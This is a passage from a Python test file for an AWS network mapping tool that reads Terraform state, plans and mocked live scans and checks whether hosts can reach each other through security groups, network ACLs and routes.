            res("aws_network_acl_association.db", {"id": "aclassoc-1", "network_acl_id": "acl-db",
                                                   "subnet_id": "subnet-db"}),
            # A rule on vpc-2's default ACL, which this state doesn't manage itself.
            res("aws_network_acl_rule.default_deny", {"id": "nacl-789", "network_acl_id": "acl-dflt2",
                                                      "rule_number": 50, "egress": False, "protocol": "tcp",
                                                      "rule_action": "deny", "cidr_block": "0.0.0.0/0",
                                                      "from_port": 22, "to_port": 22}),
            res("aws_security_group.app", {"id": "sg-app", "vpc_id": "vpc-1", "name": "app",
                                           "ingress": [], "egress": [
                                               {"cidr_blocks": ["0.0.0.0/0"], "from_port": 0, "to_port": 0,
                                                "protocol": "-1", "ipv6_cidr_blocks": [], "prefix_list_ids": [],
                                                "security_groups": [], "self": False, "description": ""}]}),
            res("aws_security_group.db", {"id": "sg-db", "vpc_id": "vpc-1", "name": "db", "egress": [],
                                          "ingress": [
                                              {"cidr_blocks": [], "from_port": 5432, "to_port": 5432,
                                               "protocol": "tcp", "ipv6_cidr_blocks": [], "prefix_list_ids": [],
                                               "security_groups": ["sg-app"], "self": False, "description": ""},
                                              {"cidr_blocks": [], "from_port": 443, "to_port": 443,
                                               "protocol": "tcp", "ipv6_cidr_blocks": [],
                                               "prefix_list_ids": ["pl-0123"], "security_groups": [],
                                               "self": False, "description": ""}]}),
            res("aws_instance.app", {"id": "i-app", "subnet_id": "subnet-app", "private_ip": "10.0.11.10",
                                     "public_ip": "", "vpc_security_group_ids": ["sg-app"],
                                     "ipv6_addresses": [], "tags": {"Name": "app"}}),
            res("aws_lb.web", {"id": LB, "arn": LB, "name": "web", "internal": False,
                               "load_balancer_type": "application", "subnets": ["subnet-app"],
                               "security_groups": ["sg-app"], "vpc_id": "vpc-1"}),
            res("aws_lb_listener.https", {"id": LB + "/l1", "load_balancer_arn": LB, "port": 443,
                                          "protocol": "HTTPS"}),
            res("aws_db_subnet_group.db", {"id": "dbsub", "name": "dbsub", "subnet_ids": ["subnet-db"]}),
            res("aws_db_instance.db", {"id": "db-1", "arn": DB, "identifier": "db1", "engine": "mysql",
                                       "db_subnet_group_name": "dbsub", "port": 3307,
                                       "availability_zone": "us-east-1b",
                                       "vpc_security_group_ids": ["sg-db"], "publicly_accessible": False}),
        ]}}}

    def test_network_acl_rules_from_terraform(self):
        from awskit import maptf
        snap = maptf.build(self.state(), "net.json")
        acl = snap.get("acl-db")
        self.assertEqual(acl.props["subnets"], ["subnet-db"])
        got = [(e["egress"], e["rule"], e["action"], e["protocol"]) for e in acl.props["entries"]]
        self.assertEqual(got, [(False, 90, "deny", "6"), (False, 100, "allow", "-1"),
                               (False, 32767, "deny", "-1"), (True, 100, "allow", "6"),
                               (True, 120, "allow", "1"), (True, 32767, "deny", "-1")])
        allow_all_in = acl.props["entries"][1]
        self.assertEqual((allow_all_in["from"], allow_all_in["to"]), (None, None))
        icmp = acl.props["entries"][4]
        self.assertEqual((icmp["icmp_type"], icmp["icmp_code"]), (0, -1))
        dflt = snap.get("acl-dflt2")
        self.assertTrue(dflt.props["default"])
        self.assertEqual(dflt.props["vpc"], "vpc-2")
        self.assertIn((False, 50, "deny"), [(e["egress"], e["rule"], e["action"]) for e in dflt.props["entries"]])
        lb = snap.get(LB)
        self.assertEqual(lb.props["security_groups"], ["sg-app"])
        self.assertEqual(lb.props["listeners"], [{"port": 443, "protocol": "HTTPS"}])
        db = snap.get(DB)
        self.assertEqual((db.props["security_groups"], db.props["port"]), (["sg-db"], 3307))
        rules = snap.get("sg-db").props["ingress"]
        self.assertIn(["pl-0123"], [r.get("prefix_lists") for r in rules])
        self.assertFalse(any("aws_network_acl" in w or "aws_lb_listener" in w for w in snap.warnings))
        # And reachability uses them.
        r = reach.check(snap, "app", "db1", "tcp", 3307)
        self.assertEqual(r.verdict, "blocked")
        self.assertEqual(r.blocked_hop.kind, "sg-in")              # sg-db allows 5432 only
        snap.get("sg-db").props["ingress"].append(mm.rule("tcp", 3307, 3307, groups=["sg-app"]))
        r = reach.check(snap, "app", "db1", "tcp", 3307)
        self.assertEqual(r.verdict, "reachable", reach.result_text(r))
        r = reach.check(snap, "app", "db1", "tcp", 5432)
        self.assertIn("denies tcp 5432 in from 10.0.11.10 at rule 90", hop(r, "nacl-in").reason)
        r = reach.check(snap, "subnet-o", "internet", "tcp", 443)
        self.assertEqual(r.verdict, "unknown")        # no route table for vpc-2 in the input
        self.assertIn("main route table", hop(r, "route").reason)

    def test_raw_tfstate_with_a_separate_rule(self):
        from awskit import maptf
        raw = {"version": 4, "terraform_version": "1.9.8", "serial": 1, "lineage": "x", "resources": [
            {"mode": "managed", "type": "aws_vpc", "name": "main", "provider": "aws",
             "instances": [{"attributes": {"id": "vpc-1", "cidr_block": "10.0.0.0/16",
                                           "arn": f"arn:aws:ec2:us-east-1:{ACCT}:vpc/vpc-1"}}]},
            {"mode": "managed", "type": "aws_subnet", "name": "s", "provider": "aws",
             "instances": [{"attributes": {"id": "subnet-1", "vpc_id": "vpc-1", "cidr_block": "10.0.1.0/24",
                                           "availability_zone": "us-east-1a"}}]},
            {"mode": "managed", "type": "aws_network_acl", "name": "a", "provider": "aws",
             "instances": [{"attributes": {"id": "acl-1", "vpc_id": "vpc-1", "subnet_ids": ["subnet-1"],
                                           "ingress": [], "egress": []}}]},
            {"mode": "managed", "type": "aws_network_acl_rule", "name": "r", "provider": "aws",
             "instances": [{"attributes": {"network_acl_id": "acl-1", "rule_number": 100, "egress": False,
                                           "protocol": "tcp", "rule_action": "allow",
                                           "cidr_block": "0.0.0.0/0", "from_port": 443, "to_port": 443}}]}]}
        snap = maptf.build(raw, "terraform.tfstate")
        got = [(e["egress"], e["rule"], e["action"]) for e in snap.get("acl-1").props["entries"]]
        self.assertEqual(got, [(False, 100, "allow"), (False, 32767, "deny"), (True, 32767, "deny")])

    def test_plan_with_network_acl_rules_known_after_apply(self):
        from awskit import maptf
        state = self.state()
        resources = state["values"]["root_module"]["resources"]
        acl = next(r for r in resources if r["address"] == "aws_network_acl.db")
        # One rule's address isn't known yet (like a VPC's IPv6 range): never a guess.
        acl["values"]["ingress"].append({"rule_no": 80, "action": "deny", "protocol": "6",
                                         "cidr_block": None, "ipv6_cidr_block": None,
                                         "from_port": 3307, "to_port": 3307})
        # In a plan, an association with the default ACL of a new VPC finds the VPC.
        resources.append({"address": "aws_network_acl_association.other", "mode": "managed",
                          "type": "aws_network_acl_association", "name": "other",
                          "values": {"network_acl_id": "vpc-2", "subnet_id": "subnet-o"}})
        snap = maptf.build(state, "net.json")
        self.assertNotIn("subnets", snap.get("vpc-2").props)
        snap.get("sg-db").props["ingress"].append(mm.rule("tcp", 3307, 3307, groups=["sg-app"]))
        r = reach.check(snap, "app", "db1", "tcp", 3307)
        self.assertEqual(r.verdict, "unknown", reach.result_text(r))
        self.assertIn("Rule 80 of network ACL db-acl has no address", hop(r, "nacl-in").reason)
        # The whole rule list known only after apply.
        plan = {"format_version": "1.2", "terraform_version": "1.9.8",
                "planned_values": state["values"],
                "resource_changes": [{"address": "aws_network_acl.db", "type": "aws_network_acl",
                                      "change": {"after_unknown": {"ingress": True}}}]}
        acl["values"]["ingress"] = []
        snap = maptf.build(plan, "plan.json")
        self.assertTrue(snap.get("acl-db").props["rules_unknown"])
        r = reach.check(snap, "app", "db1", "tcp", 5432)
        self.assertEqual(hop(r, "nacl-in").status, "unknown")
        self.assertIn("aren't known until Terraform applies", hop(r, "nacl-in").reason)

    def test_plan_with_inline_routes_to_gateways_made_in_the_same_plan(self):
        """The plan leaves out an inline route's target when it's only known after apply
        (gateway_id of a new internet gateway). The route used to be dropped, so a public
        subnet came out with no internet route and reachability said blocked."""
        from awskit import maptf

        def res(addr, values):
            rtype, name = addr.split(".")
            return {"address": addr, "mode": "managed", "type": rtype, "name": name, "values": values}

        def cfg(addr, expressions):
            rtype, name = addr.split(".")
            return {"address": addr, "mode": "managed", "type": rtype, "name": name,
                    "provider_config_key": "aws", "expressions": expressions}

        def ref(addr):
            return {"references": [addr + ".id", addr]}
        targets = {k: "" for k in ("carrier_gateway_id", "core_network_arn", "egress_only_gateway_id",
                                   "local_gateway_id", "nat_gateway_id", "network_interface_id",
                                   "transit_gateway_id", "vpc_endpoint_id", "vpc_peering_connection_id")}
        world = dict(targets, cidr_block="0.0.0.0/0", ipv6_cidr_block="", destination_prefix_list_id="")
        plan = {"format_version": "1.2", "terraform_version": "1.9.8",
                "planned_values": {"root_module": {"resources": [
                    res("aws_vpc.main", {"cidr_block": "10.9.0.0/16"}),
                    res("aws_subnet.pub", {"cidr_block": "10.9.1.0/24", "availability_zone": "us-east-2a"}),
                    res("aws_subnet.other", {"cidr_block": "10.9.2.0/24", "availability_zone": "us-east-2a"}),
                    res("aws_internet_gateway.gw", {}),
                    res("aws_route_table.pub", {"route": [world]}),
                    res("aws_route_table_association.pub", {}),
                    # The VPC's main route table, adopted: it serves subnets with no association.
                    res("aws_default_route_table.main", {"route": [world]}),
                    res("aws_security_group.web", {"name": "web", "ingress": [], "egress": [
                        {"protocol": "-1", "from_port": 0, "to_port": 0, "cidr_blocks": ["0.0.0.0/0"]}]}),
                    res("aws_instance.web", {"associate_public_ip_address": True}),
                    res("aws_instance.other", {"associate_public_ip_address": True})]}},
                "resource_changes": [
                    {"address": "aws_vpc.main", "change": {"after_unknown": {"id": True, "arn": True}}},
                    {"address": "aws_subnet.pub", "change": {"after_unknown": {"id": True, "vpc_id": True}}},
                    {"address": "aws_subnet.other", "change": {"after_unknown": {"id": True, "vpc_id": True}}},
                    {"address": "aws_internet_gateway.gw", "change": {"after_unknown": {"id": True, "vpc_id": True}}},
                    {"address": "aws_route_table.pub", "change": {"after_unknown": {
                        "id": True, "vpc_id": True, "route": [{"gateway_id": True}]}}},
                    {"address": "aws_route_table_association.pub", "change": {"after_unknown": {"id": True}}},
                    {"address": "aws_default_route_table.main", "change": {"after_unknown": {
                        "id": True, "vpc_id": True, "route": [{"gateway_id": True}]}}},
                    {"address": "aws_security_group.web", "change": {"after_unknown": {"id": True, "vpc_id": True}}},
                    {"address": "aws_instance.web", "change": {"after_unknown": {
                        "id": True, "subnet_id": True, "private_ip": True, "public_ip": True,
                        "vpc_security_group_ids": True}}},
                    {"address": "aws_instance.other", "change": {"after_unknown": {
                        "id": True, "subnet_id": True, "private_ip": True, "public_ip": True,
                        "vpc_security_group_ids": True}}}],
                "configuration": {"provider_config": {"aws": {"name": "aws", "expressions": {
                    "region": {"constant_value": "us-east-2"}}}},
                    "root_module": {"resources": [
                        cfg("aws_vpc.main", {}),
                        cfg("aws_subnet.pub", {"vpc_id": ref("aws_vpc.main")}),
                        cfg("aws_subnet.other", {"vpc_id": ref("aws_vpc.main")}),
                        cfg("aws_internet_gateway.gw", {"vpc_id": ref("aws_vpc.main")}),
                        cfg("aws_route_table.pub", {"vpc_id": ref("aws_vpc.main"),
                                                    "route": ref("aws_internet_gateway.gw")}),
                        cfg("aws_route_table_association.pub", {"subnet_id": ref("aws_subnet.pub"),
                                                                "route_table_id": ref("aws_route_table.pub")}),
                        cfg("aws_default_route_table.main", {
                            "default_route_table_id": {"references": ["aws_vpc.main.default_route_table_id",
                                                                      "aws_vpc.main"]},
                            "route": ref("aws_internet_gateway.gw")}),
                        cfg("aws_security_group.web", {"vpc_id": ref("aws_vpc.main")}),
                        cfg("aws_instance.web", {"subnet_id": ref("aws_subnet.pub"),
                                                 "vpc_security_group_ids": ref("aws_security_group.web")}),
                        cfg("aws_instance.other", {"subnet_id": ref("aws_subnet.other"),
                                                   "vpc_security_group_ids": ref("aws_security_group.web")})]}}}
        snap = maptf.build(plan, "plan.json")
        want = [{"dest": "0.0.0.0/0", "target": "aws_internet_gateway.gw"}]
        self.assertEqual(snap.get("aws_route_table.pub").props["routes"], want)
        self.assertTrue(snap.get("aws_subnet.pub").props["public"])
        r = reach.check(snap, "aws_instance.web", "internet", "tcp", 443)
        self.assertEqual(r.verdict, "reachable", reach.result_text(r))
        # The default route table belongs to the new VPC, so the other subnet uses it.
        main = snap.get("aws_default_route_table.main")
        self.assertEqual((main.parent, main.props["routes"]), ("aws_vpc.main", want))
        self.assertEqual(snap.get("aws_subnet.other").props["route_table"], "aws_default_route_table.main")
        r = reach.check(snap, "aws_instance.other", "internet", "tcp", 443)
        self.assertEqual(r.verdict, "reachable", reach.result_text(r))
        # With two possible gateways the route stays, as known after apply: can't tell.
        plan["planned_values"]["root_module"]["resources"].append(res("aws_internet_gateway.gw2", {}))
        plan["configuration"]["root_module"]["resources"][4]["expressions"]["route"] = {
            "references": ["aws_internet_gateway.gw.id", "aws_internet_gateway.gw",
                           "aws_internet_gateway.gw2.id", "aws_internet_gateway.gw2"]}
        snap = maptf.build(plan, "plan.json")
        self.assertEqual(snap.get("aws_route_table.pub").props["routes"],
                         [{"dest": "0.0.0.0/0", "target": "(known after apply)"}])
        r = reach.check(snap, "aws_instance.web", "internet", "tcp", 443)
        self.assertEqual(r.verdict, "unknown", reach.result_text(r))

    def test_the_example_two_az_vpc(self):
        from awskit import maptf
        snap = maptf.read([str(EXAMPLES / "two-az-vpc-state.json")])
        r = reach.check(snap, "internet", "bastion", "tcp", 22)
        self.assertEqual(r.verdict, "reachable", reach.result_text(r))
        self.assertTrue(any("default network ACL was assumed" in n for n in r.notes))
        r = reach.check(snap, "internet", "lab-postgres", "tcp", 5432)
        self.assertEqual(r.verdict, "blocked")
        self.assertEqual(r.blocked_hop.kind, "public-ip")
        self.assertEqual(hop(r, "sg-in").status, "blocked")
        r = reach.check(snap, "app-1", "lab-postgres", "tcp", 5432)
        self.assertEqual(r.verdict, "reachable")
        r = reach.check(snap, "bastion", "lab-postgres", "tcp", 5432)
        self.assertEqual(r.blocked_hop.kind, "sg-in")
        r = reach.check(snap, "internet", "lab-web", "tcp", 443)
        self.assertEqual(r.verdict, "reachable")
        r = reach.check(snap, "lab-web", "app-2", "tcp", 8080)
        self.assertEqual(r.verdict, "reachable")
        r = reach.check(snap, "app-1", "internet", "tcp", 443)
        self.assertEqual(r.verdict, "reachable")
        self.assertIn("nat-0a1b2c3d4e5f60041", r.path_nodes)
        r = reach.check(snap, "internet", "bastion", "tcp", 3389)
        self.assertEqual(r.verdict, "blocked")


@unittest.skipIf(mock_aws is None, "moto not installed")
class ScanTests(unittest.TestCase):
    """The live scan records network ACL rules, and security groups and ports on load
    balancers and databases."""

    def test_scan_records_what_reachability_needs(self):
        from awskit import mapscan
        with mock_aws():
            ec2 = boto3.client("ec2", region_name="us-east-1")
            vpc = ec2.create_vpc(CidrBlock="10.1.0.0/16")["Vpc"]["VpcId"]
            s1 = ec2.create_subnet(VpcId=vpc, CidrBlock="10.1.1.0/24", AvailabilityZone="us-east-1a")["Subnet"]["SubnetId"]
            s2 = ec2.create_subnet(VpcId=vpc, CidrBlock="10.1.2.0/24", AvailabilityZone="us-east-1b")["Subnet"]["SubnetId"]
            igw = ec2.create_internet_gateway()["InternetGateway"]["InternetGatewayId"]
            ec2.attach_internet_gateway(InternetGatewayId=igw, VpcId=vpc)
            rt = ec2.create_route_table(VpcId=vpc)["RouteTable"]["RouteTableId"]
            ec2.create_route(RouteTableId=rt, DestinationCidrBlock="0.0.0.0/0", GatewayId=igw)
            ec2.associate_route_table(RouteTableId=rt, SubnetId=s1)
            ec2.modify_subnet_attribute(SubnetId=s1, MapPublicIpOnLaunch={"Value": True})
            acl = ec2.create_network_acl(VpcId=vpc)["NetworkAcl"]["NetworkAclId"]
            for num, egress, proto, action, ports in ((90, False, "6", "deny", (22, 22)),
                                                      (100, False, "-1", "allow", None),
                                                      (100, True, "-1", "allow", None)):
                kw = {"PortRange": {"From": ports[0], "To": ports[1]}} if ports else {}
                ec2.create_network_acl_entry(NetworkAclId=acl, RuleNumber=num, Protocol=proto,
                                             RuleAction=action, Egress=egress, CidrBlock="0.0.0.0/0", **kw)
            assoc = [a for n in ec2.describe_network_acls()["NetworkAcls"] for a in n["Associations"]
                     if a["SubnetId"] == s1][0]
            ec2.replace_network_acl_association(AssociationId=assoc["NetworkAclAssociationId"], NetworkAclId=acl)
            sg = ec2.create_security_group(GroupName="web", Description="x", VpcId=vpc)["GroupId"]
            ec2.authorize_security_group_ingress(GroupId=sg, IpPermissions=[
                {"IpProtocol": "tcp", "FromPort": 22, "ToPort": 22, "IpRanges": [{"CidrIp": "0.0.0.0/0"}]},
                {"IpProtocol": "tcp", "FromPort": 443, "ToPort": 443, "IpRanges": [{"CidrIp": "0.0.0.0/0"}]}])
            ami = ec2.describe_images(Owners=["amazon"])["Images"][0]["ImageId"]
            inst = ec2.run_instances(ImageId=ami, MinCount=1, MaxCount=1, SubnetId=s1,
                                     SecurityGroupIds=[sg])["Instances"][0]["InstanceId"]
            elb = boto3.client("elbv2", region_name="us-east-1")
            lb = elb.create_load_balancer(Name="web", Subnets=[s1, s2], SecurityGroups=[sg],
                                          Scheme="internet-facing")["LoadBalancers"][0]["LoadBalancerArn"]
            tg = elb.create_target_group(Name="tg", Protocol="HTTP", Port=80, VpcId=vpc)["TargetGroups"][0]["TargetGroupArn"]
            elb.create_listener(LoadBalancerArn=lb, Protocol="HTTP", Port=80,
                                DefaultActions=[{"Type": "forward", "TargetGroupArn": tg}])
            rds = boto3.client("rds", region_name="us-east-1")
            rds.create_db_subnet_group(DBSubnetGroupName="g", DBSubnetGroupDescription="x", SubnetIds=[s1, s2])
            rds.create_db_instance(DBInstanceIdentifier="db1", DBInstanceClass="db.t3.micro", Engine="postgres",
                                   MasterUsername="u", MasterUserPassword="passwordpassword",
                                   DBSubnetGroupName="g", VpcSecurityGroupIds=[sg], AllocatedStorage=20)
            snap = mapscan.scan([None], ["us-east-1"], access=False)
        node = snap.get(acl)
        self.assertEqual([(e["egress"], e["rule"], e["action"], e["protocol"], e["from"], e["to"])
                          for e in node.props["entries"]],
                         [(False, 90, "deny", "6", 22, 22), (False, 100, "allow", "-1", None, None),
                          (True, 100, "allow", "-1", None, None)])
        self.assertEqual(node.props["subnets"], [s1])
        default = [n for n in snap.of_kind("nacl") if n.props.get("default") and n.props.get("vpc") == vpc][0]
        self.assertIn(32767, [e["rule"] for e in default.props["entries"]])
        lbn = snap.get(lb)
        self.assertEqual(lbn.props["security_groups"], [sg])
        self.assertEqual(lbn.props["listeners"], [{"port": 80, "protocol": "HTTP"}])
        db = next(n for n in snap.of_kind("rds"))
        self.assertEqual((db.props["security_groups"], db.props["port"]), ([sg], 5432))
        # Reachability on the scanned snapshot: rule 90 denies SSH before rule 100 allows all.
        r = reach.check(snap, "internet", inst, "tcp", 22)
        self.assertEqual(r.blocked_hop.kind, "nacl-in")
        self.assertIn("at rule 90", r.blocked_hop.reason)
        r = reach.check(snap, "internet", inst, "tcp", 443)
        self.assertEqual(r.verdict, "reachable", reach.result_text(r))
        r = reach.check(snap, "internet", "web", "tcp", 443)
        self.assertEqual(hop(r, "service").status, "blocked")       # the listener is on 80
        # moto's default security group egress allows everything, so web to db1 goes as far as
        # the database's own group, which only allows 22 and 443.
        r = reach.check(snap, "web", "db1", "tcp", 5432)
        self.assertEqual(r.blocked_hop.kind, "sg-in")

    def test_listeners_denied_in_the_scan(self):
        from botocore.exceptions import ClientError
        from awskit import mapscan

        class Client:
            def __init__(self, service):
                self.service = service

            def can_paginate(self, method):
                return False

            def describe_load_balancers(self, **k):
                return {"LoadBalancers": [{"LoadBalancerArn": LB, "LoadBalancerName": "web"}]}

            def describe_listeners(self, **k):
                raise ClientError({"Error": {"Code": "AccessDenied", "Message": "no"}},
                                  "DescribeListeners")

            def __getattr__(self, name):
                return lambda **k: {}

        class Ctx:
            account = ACCT

            def client(self, service, region=None):
                return Client(service)
        notes = mapscan.Notes("lab", "us-east-1")
        out = mapscan.task_net(Ctx(), "us-east-1", notes)
        self.assertEqual(out["listeners"], {LB: None})
        self.assertEqual(notes.denied, ["Load balancer listeners"])

    def test_denied_listener_reads_leave_listeners_unknown(self):
        from awskit import mapscan

        data = {k: [] for k, _, _ in mapscan.EC2_CALLS}
        data.update(lbs=[{"LoadBalancerArn": LB, "LoadBalancerName": "web", "VpcId": "vpc-1",
                          "AvailabilityZones": [], "Scheme": "internal", "Type": "application",
                          "SecurityGroups": ["sg-1"]}], listeners={LB: None}, dbs=[])

        class Ctx:
            account = ACCT
        snap = mm.Snapshot()
        mm.add_vpc(snap, "vpc-1", ACCT, "us-east-1", ["10.0.0.0/16"])
        mapscan._build_network(snap, Ctx(), "us-east-1", data)
        self.assertNotIn("listeners", snap.get(LB).props)
        self.assertEqual(snap.get(LB).props["security_groups"], ["sg-1"])

    def test_cloud_wan_routes_are_kept(self):
        """A route to a Cloud WAN core network used to be dropped, so 10.50.0.0/16 seemed to
        go out the internet gateway and reachability said blocked."""
        from awskit import mapscan
        wan = f"arn:aws:networkmanager::{ACCT}:core-network/core-network-0abc"
        data = {k: [] for k, _, _ in mapscan.EC2_CALLS}
        data.update(lbs=[], dbs=[], listeners={})
        data["vpcs"] = [{"VpcId": "vpc-1", "CidrBlock": "10.0.0.0/16"}]
        data["subnets"] = [{"SubnetId": "subnet-1", "VpcId": "vpc-1", "CidrBlock": "10.0.1.0/24",
                            "AvailabilityZone": "us-east-1a"}]
        data["igws"] = [{"InternetGatewayId": "igw-1", "Attachments": [{"VpcId": "vpc-1", "State": "available"}]}]
        data["route_tables"] = [{"RouteTableId": "rtb-1", "VpcId": "vpc-1", "Associations": [{"SubnetId": "subnet-1"}],
                                 "Routes": [{"DestinationCidrBlock": "10.0.0.0/16", "GatewayId": "local", "State": "active"},
                                            {"DestinationCidrBlock": "10.50.0.0/16", "CoreNetworkArn": wan, "State": "active"},
                                            {"DestinationCidrBlock": "0.0.0.0/0", "GatewayId": "igw-1", "State": "active"}]}]
        data["nacls"] = [{"NetworkAclId": "acl-1", "VpcId": "vpc-1", "IsDefault": True,
                          "Associations": [{"SubnetId": "subnet-1"}],
                          "Entries": [{"RuleNumber": 100, "Egress": eg, "RuleAction": "allow", "Protocol": "-1",
                                       "CidrBlock": "0.0.0.0/0"} for eg in (False, True)]}]
        data["sgs"] = [{"GroupId": "sg-1", "VpcId": "vpc-1", "GroupName": "x", "IpPermissions": [],
                        "IpPermissionsEgress": [{"IpProtocol": "-1", "IpRanges": [{"CidrIp": "0.0.0.0/0"}]}]}]
        data["reservations"] = [{"Instances": [{"InstanceId": "i-1", "SubnetId": "subnet-1", "VpcId": "vpc-1",
                                                "PrivateIpAddress": "10.0.1.5", "State": {"Name": "running"},
                                                "SecurityGroups": [{"GroupId": "sg-1"}]}]}]

        class Ctx:
            account = ACCT
        snap = mm.Snapshot()
        mapscan._build_network(snap, Ctx(), "us-east-1", data)
        mm.finish(snap)
        self.assertIn({"dest": "10.50.0.0/16", "target": wan}, snap.get("rtb-1").props["routes"])
        r = reach.check(snap, "i-1", "10.50.1.1", "tcp", 443)
        self.assertEqual(r.verdict, "unknown", reach.result_text(r))
        self.assertIn("10.50.0.0/16", hop(r, "route").reason)

    def test_subnet_ipv6_blocks_taken_off_dont_count(self):
        from awskit import mapscan
        data = {k: [] for k, _, _ in mapscan.EC2_CALLS}
        data.update(lbs=[], dbs=[], listeners={})
        data["vpcs"] = [{"VpcId": "vpc-1", "CidrBlock": "10.0.0.0/16"}]
        data["subnets"] = [
            {"SubnetId": "subnet-1", "VpcId": "vpc-1", "CidrBlock": "10.0.1.0/24",
             "Ipv6CidrBlockAssociationSet": [
                 {"Ipv6CidrBlock": "2001:db8:0:1::/64", "Ipv6CidrBlockState": {"State": "disassociated"}},
                 {"Ipv6CidrBlock": "2001:db8:0:2::/64", "Ipv6CidrBlockState": {"State": "associated"}}]},
            {"SubnetId": "subnet-2", "VpcId": "vpc-1", "CidrBlock": "10.0.2.0/24",
             "Ipv6CidrBlockAssociationSet": [
                 {"Ipv6CidrBlock": "2001:db8:0:3::/64", "Ipv6CidrBlockState": {"State": "disassociating"}}]}]

        class Ctx:
            account = ACCT
        snap = mm.Snapshot()
        mapscan._build_network(snap, Ctx(), "us-east-1", data)
        mm.finish(snap)
        got = {n: snap.get(n).props.get("ipv6_cidr", "") for n in ("subnet-1", "subnet-2")}
        self.assertEqual(got, {"subnet-1": "2001:db8:0:2::/64", "subnet-2": ""})


# =================================================================== the command line

class CommandLineTests(unittest.TestCase):
    def run_map(self, *args):
        from awskit import cloudmap
        out, errs = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(errs):
            code = cloudmap.main(list(args))
        return code, out.getvalue(), errs.getvalue()

    def test_exit_codes(self):
        state = str(EXAMPLES / "two-az-vpc-state.json")
        code, out, _ = self.run_map("reach", state, "internet", "bastion", "--port", "22")
        self.assertEqual(code, 0, out)
        self.assertIn("Reachable", out)
        code, out, _ = self.run_map("reach", state, "bastion", "lab-postgres", "--port", "5432")
        self.assertEqual(code, 3)
        self.assertIn("blocked", out)
        self.assertIn("Security group lab-db, inbound", out)
        code, out, _ = self.run_map("reach", state, "bastion", "internet", "--protocol", "icmp",
                                    "--json")
        self.assertEqual(code, 0)
        data = json.loads(out)
        self.assertEqual((data["verdict"], data["protocol"], data["port"]), ("reachable", "icmp", None))
        self.assertIsNone(data["blocked_at"])
        # Unknown: a snapshot whose network ACL rules weren't recorded.
        snap = base()
        snap.get("acl-default").props.pop("entries")
        path = Path(TMP) / "cli-old.cloudmap.json"
        done(snap).save(path)
        code, out, _ = self.run_map("reach", str(path), "app", "db1", "--port", "5432")
        self.assertEqual(code, 4)
        self.assertIn("Unknown  Can't tell whether app can reach db1", out)
        code, out, errs = self.run_map("reach", str(path), "app", "nothing-here")
        self.assertEqual(code, 1)
        self.assertIn("Couldn't find nothing-here", errs)
        code, out, errs = self.run_map("reach", str(path), "app")
        self.assertEqual(code, 1)
        code, out, errs = self.run_map("reach", str(Path(TMP) / "missing.json"), "a", "b")
        self.assertEqual(code, 1)
        bad = Path(TMP) / "bad.json"
        bad.write_text("{nope")
        code, out, errs = self.run_map("reach", str(bad), "a", "b")
        self.assertEqual(code, 1)
        self.assertIn("isn't valid JSON", errs)
        deep = Path(TMP) / "deep.json"
        deep.write_text('{"a": ' + "[" * 200000 + "]" * 200000 + "}")
        code, out, errs = self.run_map("reach", str(deep), "a", "b")
        self.assertEqual(code, 1)
        self.assertIn("nested too deeply", errs)
        # A damaged snapshot is a plain error, not a traceback.
        snap = done(base())
        data = json.loads(snap.dumps())
        next(n for n in data["nodes"] if n["id"] == "acl-default")["props"]["entries"].append("junk")
        damaged = Path(TMP) / "damaged.cloudmap.json"
        damaged.write_text(json.dumps(data))
        code, out, errs = self.run_map("reach", str(damaged), "app", "db1", "--port", "5432")
        self.assertEqual(code, 1)
        self.assertIn("can't read", errs)

    def test_list(self):
        code, out, _ = self.run_map("reach", str(EXAMPLES / "two-az-vpc-state.json"), "--list")
        self.assertEqual(code, 0)
        self.assertIn("bastion", out)
        self.assertIn("internet-ipv6", out)
        code, out, _ = self.run_map("reach", str(EXAMPLES / "two-az-vpc-state.json"), "--list", "--json")
        self.assertIn("i-0a1b2c3d4e5f60093", [e["key"] for e in json.loads(out)])

    def test_through_awskit(self):
        env = dict(os.environ, PYTHONPATH=str(ROOT))
        r = subprocess.run([sys.executable, "-m", "awskit", "map", "reach",
                            str(EXAMPLES / "two-az-vpc-state.json"), "app-1", "lab-postgres",
                            "--port", "5432"], capture_output=True, text=True, cwd=ROOT, env=env)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("app-1 can reach lab-postgres on tcp 5432", r.stdout)
        r = subprocess.run([sys.executable, "-m", "awskit", "map", "reach", "--help"],
                           capture_output=True, text=True, cwd=ROOT, env=env)
        self.assertEqual(r.returncode, 0)
        self.assertIn("3 blocked", r.stdout)


if __name__ == "__main__":
    unittest.main()
